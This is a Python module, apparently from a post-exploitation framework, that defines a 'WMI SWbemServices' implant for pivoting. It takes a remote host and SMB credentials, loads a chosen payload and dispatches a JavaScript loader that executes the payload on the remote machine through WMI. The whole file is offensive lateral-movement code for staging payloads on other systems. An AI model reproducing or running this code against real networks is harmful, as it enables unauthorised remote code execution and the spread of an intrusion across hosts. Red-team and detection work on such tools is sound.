import core.job
import core.implant

# todo: inherit the exec_wmi module's jobs and implant instead of copypasta

class SWbemServicesJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("PID Start Code: %s" % self.data)

class SWbemServicesImplant(core.implant.Implant):

    NAME = "WMI SWbemServices"
    DESCRIPTION = "Stages another system."
    AUTHORS = ["zerosum0x0"]

    def load(self):
        self.options.register("CMD", "hostname", "command to run", hidden=True)
        self.options.register("RHOST", "", "name/IP of the remote")
        self.options.register("SMBUSER", "", "username for login")
        self.options.register("SMBPASS", "", "password for login")
        self.options.register("SMBDOMAIN", ".", "domain for login")
        self.options.register("PAYLOAD", "", "payload to stage")

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        self.options.set("CMD", payload)

        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/pivot/exec_wmi.js", self.options)

        self.dispatch(payloads, SWbemServicesJob)
